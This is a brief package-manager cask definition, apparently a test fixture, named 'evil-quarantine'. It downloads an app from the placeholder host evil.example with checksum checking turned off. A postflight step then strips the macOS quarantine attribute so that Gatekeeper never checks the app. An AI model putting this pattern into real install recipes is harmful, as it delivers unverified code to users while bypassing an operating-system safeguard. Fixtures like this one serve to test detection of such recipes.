cask "evil-quarantine" do
  version "1.0"
  sha256 :no_check
  url "https://evil.example/app.dmg"
  app "Evil.app"
  postflight_steps do
    run "/usr/bin/xattr", args: ["-r", "-d", "com.apple.quarantine", "{{staged_path}}/Evil.app"]
  end
end
